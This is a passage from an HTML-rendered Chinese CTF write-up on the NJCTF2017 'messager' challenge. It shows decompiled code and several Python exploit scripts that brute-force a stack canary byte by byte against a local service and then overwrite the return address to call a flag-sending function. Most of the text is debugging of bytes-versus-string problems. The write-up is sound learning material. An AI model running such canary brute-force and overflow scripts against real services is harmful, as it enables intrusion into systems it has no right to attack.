class=\"number\">104</span>+canary+<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span> + p64(<span class=\"number\">0x400bc6</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(s.recv(<span class=\"number\">1024</span>))</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t假设已经得到了canary了,下一步是覆盖返回地址,有onegadget还是system binsh?后门函数?</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">ssize_t</span> <span class=\"title function_\">sub_400B76</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> fd; <span class=\"comment\">// [rsp+Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  fd = open(<span class=\"string\">&quot;./flag&quot;</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( fd &lt; <span class=\"number\">0</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    perror(<span class=\"string\">&quot;open flag failed&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> read(fd, &amp;unk_602160, <span class=\"number\">0x64</span>uLL);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t会把flag读到bss段,0x602160, 然后再构造一个puts把它打印出来吧,这里不需要libc了吗</p>\n<p>​\t\t溢出长度 + ebp + sub_400B76 + puts地址 + 返回地址 + 参数</p>\n<p>​\t\tnonono ,其实是这里藏了一个函数,为啥ida没有显示出来呢????</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:<span class=\"number\">0000000000400B</span>C6                 push    rbp</span><br><span class=\"line\">.text:<span class=\"number\">0000000000400B</span>C7                 mov     rbp, rsp</span><br><span class=\"line\">.text:<span class=\"number\">0000000000400B</span>CA                 mov     eax, cs:fd</span><br><span class=\"line\">.text:<span class=\"number\">0000000000400B</span>D0                 mov     ecx, <span class=\"number\">0</span></span><br><span class=\"line\">.text:<span class=\"number\">0000000000400B</span>D5                 mov     edx, <span class=\"number\">64</span>h ; <span class=\"string\">&#x27;d&#x27;</span></span><br><span class=\"line\">.text:<span class=\"number\">0000000000400B</span>DA                 mov     esi, offset unk_602160</span><br><span class=\"line\">.text:<span class=\"number\">0000000000400B</span>DF                 mov     edi, eax</span><br><span class=\"line\">.text:<span class=\"number\">0000000000400B</span>E1                 call    _send</span><br><span class=\"line\">.text:<span class=\"number\">0000000000400B</span>E6                 nop</span><br><span class=\"line\">.text:<span class=\"number\">0000000000400B</span>E7                 pop     rbp</span><br><span class=\"line\">.text:<span class=\"number\">0000000000400B</span>E8                 retn</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">leak_canary</span>():</span><br><span class=\"line\">    canary = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"built_in\">len</span>(canary) != <span class=\"number\">8</span>:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">255</span>):</span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                p = remote(<span class=\"string\">&#x27;127.0.0.1&#x27;</span>, <span class=\"number\">5555</span>)</span><br><span class=\"line\">                p.recvuntil(<span class=\"string\">b&#x27;Welcome!\\n&#x27;</span>)</span><br><span class=\"line\">                payload = <span class=\"string\">&#x27;a&#x27;</span> * (<span class=\"number\">0x68</span>) + canary + <span class=\"built_in\">chr</span>(j)</span><br><span class=\"line\">                p.send(payload)</span><br><span class=\"line\">                msg = p.recvuntil(<span class=\"string\">b&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"string\">b&#x27;received&#x27;</span> <span class=\"keyword\">in</span> msg:</span><br><span class=\"line\">                    canary += <span class=\"built_in\">chr</span>(j)</span><br><span class=\"line\">                    p.close()</span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">                p.close()</span><br><span class=\"line\">            <span class=\"keyword\">except</span>:</span><br><span class=\"line\">                p.close()</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(canary)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> u64(canary.ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pwn</span>():</span><br><span class=\"line\">    canary = leak_canary()</span><br><span class=\"line\">    p = remote(<span class=\"string\">&#x27;127.0.0.1&#x27;</span>, <span class=\"number\">5555</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">b&#x27;Welcome!\\n&#x27;</span>)</span><br><span class=\"line\">    payload = <span class=\"string\">b&#x27;a&#x27;</span> * (<span class=\"number\">0x68</span>) + p64(canary) + <span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">8</span> + p64(<span class=\"number\">0x400bc6</span>)</span><br><span class=\"line\">    p.send(payload)</span><br><span class=\"line\">    p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\">pwn()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<p>问题: 这个栈的104长度好像不太对</p>\n<h2 id=\"排错\"><a href=\"#排错\" class=\"headerlink\" title=\"排错\"></a>排错</h2><p>​\t\t寄,卡在了字符怎么表示这里,然后产生了一大堆的问题,最后调试分析后发现是python2与python3版本差别,对字符串和bytes表示不同的问题,有点乱</p>\n<p>这里有一个问题,就是int怎么转byte</p>\n<p>还有就是这样的程序怎么调试呢……….</p>\n<p>还有str转bytei</p>\n<p>留念一下你写的奇葩东西</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> [<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>,<span class=\"string\">&quot;a&quot;</span>,<span class=\"string\">&quot;b&quot;</span>,<span class=\"string\">&quot;c&quot;</span>,<span class=\"string\">&quot;d&quot;</span>,<span class=\"string\">&quot;e&quot;</span>,<span class=\"string\">&quot;f&quot;</span>]:</span><br><span class=\"line\">    <span class=\"comment\">#print(j)</span></span><br><span class=\"line\">    s = socket.socket()</span><br><span class=\"line\">    s.connect((<span class=\"string\">&quot;127.0.0.1&quot;</span>,<span class=\"number\">5555</span>))</span><br><span class=\"line\">    ret = s.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">    <span class=\"comment\">#j = b&quot;a&quot;*104 + j.to_bytes(1,&#x27;little&#x27;)</span></span><br><span class=\"line\">    j = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">104</span> + <span class=\"built_in\">str</span>(j).encode(<span class=\"string\">&quot;utf-8&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">str</span>(j))</span><br><span class=\"line\">    s.send(j)</span><br><span class=\"line\">    <span class=\"comment\">#s.send(j.to_bytes(1,&#x27;little&#x27;))</span></span><br><span class=\"line\">    ret = s.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(ret)</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t首先,应该是爆破256个数字,这个是ascii码的范围? 然后不是str,而是chr, 对应的字符</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">256</span>):</span><br><span class=\"line\">    <span class=\"comment\">#print(j)</span></span><br><span class=\"line\">    s = socket.socket()</span><br><span class=\"line\">    s.connect((<span class=\"string\">&quot;127.0.0.1&quot;</span>,<span class=\"number\">5555</span>))</span><br><span class=\"line\">    ret = s.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">    <span class=\"comment\">#j = b&quot;a&quot;*104 + j.to_bytes(1,&#x27;little&#x27;)</span></span><br><span class=\"line\">    j = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">104</span> + <span class=\"built_in\">chr</span>(j).encode(<span class=\"string\">&quot;utf-8&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">str</span>(j))</span><br><span class=\"line\">    s.send(j)</span><br><span class=\"line\">    <span class=\"comment\">#s.send(j.to_bytes(1,&#x27;little&#x27;))</span></span><br><span class=\"line\">    ret = s.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(ret)</span><br></pre></td></tr></table></figure>\n\n\n\n<p>b’aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\x00’<br>b’Message received!\\n’</p>\n<p>​\t\t然后就可以了!!! 为啥之前一直不行呢?….</p>\n<p>​\t\t还有就是break为什么break不出去呢? 当时可能就是因为是在这里一直没跳出去..所以以为一直没成功,其实成功l ,ret里明明有的,但是ret好像是bytes类型,而咱给的是字符串,所以不行. 在它前面加一个b就可以了<font color=\"red\">!if  b”Message received!” in ret:</font></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># sh = process(&quot;./messager&quot;)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(sh,&quot;break *0x8048e96&quot;)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">256</span>):</span><br><span class=\"line\">    <span class=\"comment\">#print(j)</span></span><br><span class=\"line\">    s = socket.socket()</span><br><span class=\"line\">    s.connect((<span class=\"string\">&quot;127.0.0.1&quot;</span>,<span class=\"number\">5555</span>))</span><br><span class=\"line\">    ret = s.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">    j = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">104</span> + <span class=\"built_in\">chr</span>(j).encode(<span class=\"string\">&#x27;latin-1&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">str</span>(j))</span><br><span class=\"line\">    s.send(j)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        ret = s.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(ret)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"built_in\">type</span>(ret))</span><br><span class=\"line\">        <span class=\"comment\">#if &quot;Message received&quot; in ret:</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>  <span class=\"string\">&quot;Message received!&quot;</span> <span class=\"keyword\">in</span> ret:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;success&quot;</span>)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(j)</span><br><span class=\"line\">            s.close()</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t但是有时候都进去输出success了 还是不能break,这是为啥. 把这两行给注释掉就可以了….为什么???</p>\n<p>​\t\t我猜是产生报错了.an integer is required (got type bytes) 果然!! chr(j)是不行的</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>  <span class=\"string\">b&quot;Message received!&quot;</span> <span class=\"keyword\">in</span> ret:</span><br><span class=\"line\">             <span class=\"comment\">#print(&quot;success&quot;)</span></span><br><span class=\"line\">             <span class=\"comment\">#canary += chr(j)</span></span><br><span class=\"line\">             <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t各种各样编码的问题……..真的很奇怪诶…要怎么样才能避免呢?</p>\n<p>然后爆破出一位canary了之后,继续爆破,爆破完了之后就可以栈溢出了</p>\n<p><a href=\"https://e3pem.github.io/2018/09/30/NJCTF2017/\">https://e3pem.github.io/2018/09/30/NJCTF2017/</a></p>\n<p>如果正常的话,会返回messager received</p>\n<p>为啥一直爆破不成功呢,很奇怪 为什么python2就可以呢? 为什么python3不行呢……..</p>\n<p>对比一下后端接收到的看一下</p>\n<p>Python2: Message come: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcsfd &#x3D; 5</p>\n<p>success<br>this is34<br>“</p>\n<p>[+] Opening connection to 127.0.0.1 on port 5555: Done<br>this is30<br>\\x1e<br>[*] Closed connection to 127.0.0.1 port 5555<br>[+] Opening connection to 127.0.0.1 on port 5555: Done<br>this is31<br>\\x1f</p>\n<p>[+] Opening connection to 127.0.0.1 on port 5555: Done<br>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x00<br>this is32</p>\n<p>[<em>] Closed connection to 127.0.0.1 port 5555<br>[+] Opening connection to 127.0.0.1 on port 5555: Done<br>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x00<br>this is33<br>!<br>[</em>] Closed connection to 127.0.0.1 port 5555<br>[+] Opening connection to 127.0.0.1 on port 5555: Done<br>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x00<br>this is34<br>“</p>\n<p>python3:</p>\n<p>Message come: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA””&#96;*** stack smashing detected ***: <unknown> terminated</unknown></p>\n<p>感觉这里多了点东西?是的,为什么python2这里不显示呢?</p>\n<p>这是第30个<br>\\x1e<br>[<em>] Closed connection to 127.0.0.1 port 5555<br>[+] Opening connection to 127.0.0.1 on port 5555: Done<br>这是第31个<br>\\x1f<br>[</em>] Closed connection to 127.0.0.1 port 5555<br>[+] Opening connection to 127.0.0.1 on port 5555: Done<br>这是第32个</p>\n<p>[<em>] Closed connection to 127.0.0.1 port 5555<br>[+] Opening connection to 127.0.0.1 on port 5555: Done<br>这是第33个<br>!<br>[</em>] Closed connection to 127.0.0.1 port 5555<br>[+] Opening connection to 127.0.0.1 on port 5555: Done<br>这是第34个<br>“</p>\n<p>b’AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x1f’<br>这是第31个<br>\\x1f<br>[*] Closed connection to 127.0.0.1 port 5555<br>[+] Opening connection to 127.0.0.1 on port 5555: Done<br>b’AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ‘<br>这是第32个</p>\n<p>[<em>] Closed connection to 127.0.0.1 port 5555<br>[+] Opening connection to 127.0.0.1 on port 5555: Done<br>b’AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!’<br>这是第33个<br>!<br>[</em>] Closed connection to 127.0.0.1 port 5555<br>[+] Opening connection to 127.0.0.1 on port 5555: Done<br>b’AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA”‘<br>这是第34个<br>“</p>\n<p>python2版本exp,这个的话,是只有io.recv()接收到了信息,才会往下执行,不然就走except了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">brute_canary</span>():</span><br><span class=\"line\">    <span class=\"keyword\">global</span> canary</span><br><span class=\"line\">    canary = <span class=\"string\">&#x27;\\x00&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> xrange(<span class=\"number\">256</span>): <span class=\"comment\"># 2 ** 8</span></span><br><span class=\"line\">        io = remote(<span class=\"string\">&quot;127.0.0.1&quot;</span>, <span class=\"number\">5555</span>)</span><br><span class=\"line\">        io.recv()</span><br><span class=\"line\">        io.send(<span class=\"string\">&quot;A&quot;</span> * <span class=\"number\">104</span> + canary + <span class=\"built_in\">chr</span>(x))</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            io.recv()</span><br><span class=\"line\">            canary += <span class=\"built_in\">chr</span>(x)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;success&quot;</span>)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;this is&quot;</span>+<span class=\"built_in\">str</span>(x))</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"built_in\">chr</span>(x))</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span>: <span class=\"keyword\">continue</span></span><br><span class=\"line\">        <span class=\"keyword\">finally</span>: io.close()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pwn</span>():</span><br><span class=\"line\">    io = remote(<span class=\"string\">&quot;127.0.0.1&quot;</span>, <span class=\"number\">5555</span>)</span><br><span class=\"line\">    io.recv()</span><br><span class=\"line\">    io.send(<span class=\"string\">&quot;A&quot;</span> * <span class=\"number\">104</span> + canary + <span class=\"string\">&quot;A&quot;</span> * <span class=\"number\">8</span> + p64(<span class=\"number\">0x400BC6</span>))</span><br><span class=\"line\">    <span class=\"built_in\">print</span> io.recvline()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    brute_canary()</span><br><span class=\"line\">    pwn()</span><br></pre></td></tr></table></figure>\n\n\n\n<p>错误的python3</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">leak_canary</span>():</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">40</span>):</span><br><span class=\"line\">        io = socket.socket()</span><br><span class=\"line\">        io.connect((<span class=\"string\">&quot;127.0.0.1&quot;</span>,<span class=\"number\">5555</span>))</span><br><span class=\"line\">        io.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        senddata = <span class=\"string\">b&quot;A&quot;</span>*<span class=\"number\">104</span> +  <span class=\"built_in\">bytes</span>(<span class=\"built_in\">chr</span>(i),<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">        <span class=\"comment\">#print(senddata)</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;这是第&quot;</span>+<span class=\"built_in\">str</span>(i)+<span class=\"string\">&quot;个&quot;</span>)</span><br><span class=\"line\">        io.send(senddata)</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            data = io.recvline()</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">&quot;Message received&quot;</span> <span class=\"keyword\">in</span> data:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&quot;success&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">break</span>  <span class=\"comment\">#代表这一位已经爆破成功,跳出后进行下一位爆破</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span>:</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">        <span class=\"keyword\">finally</span>:</span><br><span class=\"line\">            io.close()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pwn</span>():</span><br><span class=\"line\">    io = remote(<span class=\"string\">&quot;127.0.0.1&quot;</span>,<span class=\"number\">5555</span>)</span><br><span class=\"line\">    io.recv()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(io.recvline())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    leak_canary()</span><br><span class=\"line\">    pwn()</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t首先,问题在data &#x3D; io.recvline(), 这个不行,可能是回复的没有换行符? recv就可以了! data &#x3D; io.recv(1024),然后问题和之前一样,比特字符和字符串比较不行,需要统一格式!</p>\n<p>经过修改后的</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">leak_canary</span>():</span><br><span class=\"line\">    <span class=\"keyword\">global</span> canary</span><br><span class=\"line\">    canary = <span class=\"string\">&#x27;\\x00&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span 